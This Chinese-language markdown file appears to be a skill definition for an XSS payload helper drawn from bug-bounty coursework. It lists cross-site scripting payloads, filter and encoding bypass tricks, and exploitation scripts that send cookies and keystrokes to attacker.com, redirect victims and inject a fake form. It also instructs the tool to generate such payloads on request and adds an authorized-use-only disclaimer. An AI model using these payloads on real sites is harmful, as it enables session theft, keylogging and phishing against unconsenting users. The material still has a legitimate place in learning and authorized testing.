# Bug-Bounty-XSS-Helper - XSS Payload 生成与解释

**来源**: Bug Bounty 课程学习提取
**版本**: 1.0
**创建时间**: 2026-04-02

---

## 功能描述

生成 XSS Payload，解释原理，提供绕过技巧。

**⚠️ 仅用于授权测试和学习**

---

## Payload 类型

### 基础 Payload
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### 事件处理器
```html
onerror=<alert(1)>
onload=alert(1)
onclick=alert(1)
onmouseover=alert(1)
onfocus=alert(1)
onanimationend=alert(1)
```

### 编码绕过
```html
<!-- HTML 实体 -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- URL 编码 -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Base64 -->
<script>atob('YWxlcnQoMSk=')</script>
```

### 过滤绕过
```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 双写绕过 -->
<scr<script>ipt>alert(1)</script>

<!-- 使用注释 -->
<script/*>/alert(1)</script>

<!-- SVG 上下文 -->
<svg><script>alert(1)</script></svg>
```

### 利用 Payload
```html
<!-- 窃取 Cookie -->
<script>fetch('https://attacker.com?c='+document.cookie)</script>

<!-- 重定向 -->
<script>window.location='https://attacker.com'</script>

<!-- 键盘记录 -->
<script>document.onkeydown=e=>fetch('https://attacker.com?k='+e.key)</script>

<!-- 伪造页面 -->
<script>document.body.innerHTML='<form action="https://attacker.com">...</form>'</script>
```

---

## 使用方式

用户请求 XSS Payload 时，根据场景生成:
- 测试 Payload (检测漏洞)
- 利用 Payload (证明影响)
- 绕过 Payload (绕过过滤)

---

## 安全声明

⚠️ **仅用于授权测试和学习**
❌ 禁止用于未授权攻击

---

*Bug-Bounty-XSS-Helper v1.0 | 2026-04-02*
